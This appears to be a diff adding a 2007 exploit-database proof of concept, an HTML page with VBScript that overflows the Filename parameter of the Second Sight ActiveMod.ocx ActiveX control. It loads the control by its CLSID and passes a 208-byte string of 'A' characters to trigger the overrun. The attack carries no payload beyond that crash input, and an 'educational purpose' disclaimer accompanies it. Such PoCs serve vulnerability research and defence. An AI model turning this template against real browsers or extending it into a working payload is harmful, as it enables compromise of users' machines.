@@ -1,0 +1,57 @@
+<!--
+
+  ===============================================================================================
+                        Second Sight Software ActiveMod.ocx ActiveX Buffer Overflow POC
+                                            By Umesh Wanve 
+  ==============================================================================================   
+        
+  Date : 24-04-2007
+ 
+  Tested on Windows 2000 SP4 Server English
+            Windows 2000 SP4 Professional English
+  
+  Reference: http://www.securityfocus.com/bid/23554
+
+  Vendor: http://www.freetoolsassociation.com
+          http://www.freetoolsassociation.com/fta/activegs/activemod.cab 
+
+
+  
+  Desc: The filename parameter of CLSID 2078D6EC-693C-4FB2-AE7B-A6B8D2BC4DC8 is vulnerable. This activex gives error like,
+      Buffer Overrun detected. This is complied with /GS flag.
+
+  PS. This was written for educational purpose. Use it at your own risk.Author will be not be
+      responsible for any damage.
+ 
+  Always thanks to Metasploit and Stroke.
+
+-->
+
+
+<html>
+
+<title>
+ Second Sight Software ActiveMod.ocx ActiveX Buffer Overflow POC - By Umesh Wanve
+</title>
+
+<body>
+<OBJECT id="target" WIDTH=445 HEIGHT=40 classid="clsid:2078D6EC-693C-4FB2-AE7B-A6B8D2BC4DC8" > </OBJECT>
+
+<script language="vbscript">
+targetFile = "C:\Research\activemod\ActiveMod.ocx"
+prototype  = "Invoke_Unknown Filename As String"
+memberName = "Filename"
+progid     = "ActiveModLib.ActiveMod"
+argCount   = 1
+
+arg1=String(208, "A")
+
+target.Filename = arg1
+
+</script>
+
+</body>
+
+</html>
+
+# milw0rm.com [2007-04-24]
